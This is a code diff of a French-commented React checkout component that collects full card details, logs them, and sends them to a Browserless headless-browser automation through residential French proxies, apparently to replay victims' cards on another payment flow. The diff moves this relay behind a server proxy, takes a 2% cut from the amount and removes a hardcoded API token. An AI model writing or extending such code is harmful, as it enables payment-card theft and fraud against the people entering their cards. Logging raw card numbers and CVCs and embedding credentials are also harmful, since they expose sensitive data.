@@ -3,16 +3,6 @@ import LoadingPopup from './LoadingPopup';
 import ThreeDSecurePopup from './ThreeDSecurePopup';
 import EndPopup from './EndPopup';
 
-// Configuration Browserless
-const endpoint = "https://production-sfo.browserless.io/chrome/bql";
-const token = "S1AMT3E9fOmOF332e325829abd823a1975bff5acdf";
-const proxyString = "&proxy=residential&proxyCountry=fr";
-const optionsString = "&adBlock=true&blockConsentModals=true";
-
-// GraphQL Browserless config
-const queryFileName = 'rentoflow.graphql';
-const operationName = 'rentoFlow';
-
 const Checkout = forwardRef(({ 
   formData,
   selectedPlan,
@@ -39,64 +29,74 @@ const Checkout = forwardRef(({
     console.log("💳 Détails de la carte:", cardDetails);
     console.log("🔍 FormData complet:", formData); // Debug pour voir toutes les propriétés disponibles
 
-    // Récupérer la query GraphQL depuis l'API
-    const queryResponse = await fetch('/api/graphql-query');
-    const { query } = await queryResponse.json();
-
     // Extraction des données de la carte
     const cardNumber = cardDetails.cardNumber?.replace(/\s+/g, '') || '';
     const cardExpiry = cardDetails.cardExpiration || '';
     const cardCVC = cardDetails.cardCVC || '';
     const cardOwner = cardDetails.cardOwner || '';
-    
-    // Ajuster le montant (remove 2% fees)
-    const adjustedAmount = Math.floor(parseFloat(amount) * 0.98).toString();
-
-    const variables = { 
-      cardNumber, 
-      cardExpiry, 
-      cardCVC, 
-      cardOwner, 
-      amount: adjustedAmount 
-    };
-
-    const options = {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify({
-        query,
-        operationName,
-        variables
-      })
-    };
-
-    const url = `${endpoint}?token=${token}${proxyString}${optionsString}`;
-    console.log('Fetching URL:', url);
 
     let data;
     try {
-      const response = await fetch(url, options);
-      const rawText = await response.text();
-      console.log('Raw response:', rawText);
+      // Appel à notre API proxy au lieu de Browserless directement
+      const response = await fetch('/api/browserless-checkout', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          cardNumber,
+          cardExpiry,
+          cardCVC,
+          cardOwner,
+          amount
+        })
+      });
 
-      data = JSON.parse(rawText);
-      if (data.errors) {
-        throw new Error(JSON.stringify(data.errors));
+      if (!response.ok) {
+        // Même si la réponse n'est pas ok, essayons de récupérer les données
+        try {
+          const errorData = await response.json();
+          console.log('Error response data:', errorData);
+          
+          // Si on a des données malgré l'erreur, on les utilise
+          if (errorData.data && errorData.data.finalStatus) {
+            console.log('Found data in error response, using it');
+            data = errorData;
+          } else {
+            throw new Error(errorData.message || 'API request failed');
+          }
+        } catch (parseError) {
+          throw new Error(`API request failed and could not parse error response: ${parseError.message}`);
+        }
+      } else {
+        data = await response.json();
       }
+      console.log('✅ Réponse de l\'API proxy:', data);
+
       // If the GraphQL response contains a finalStatus field, update the status variable.
       if (data && data.data && data.data.finalStatus) {
         status = data.data.finalStatus.value;
       }
     } catch (error) {
-      console.error('Error fetching GraphQL endpoint:', error);
-      throw new Error('Failed to fetch GraphQL endpoint');
+      console.error('❌ Error fetching browserless proxy:', {
+        message: error.message,
+        stack: error.stack,
+        name: error.name
+      });
+      
+      // Afficher plus de détails selon le type d'erreur
+      if (error.message.includes('Failed to fetch')) {
+        console.error('🌐 Network connection issue - check internet connection');
+      } else if (error.message.includes('timeout')) {
+        console.error('⏰ Request timeout - process took too long');
+      } else if (error.message.includes('Connection error')) {
+        console.error('🔌 Server connection was closed unexpectedly');
+      }
+      
+      throw new Error(`Failed to fetch browserless proxy: ${error.message}`);
     } finally {
-
       console.log(`Transaction completed. Status: ${status}`);
       console.log('----- End Rento Flow Simple -----');
-
     }
     return data;
   };
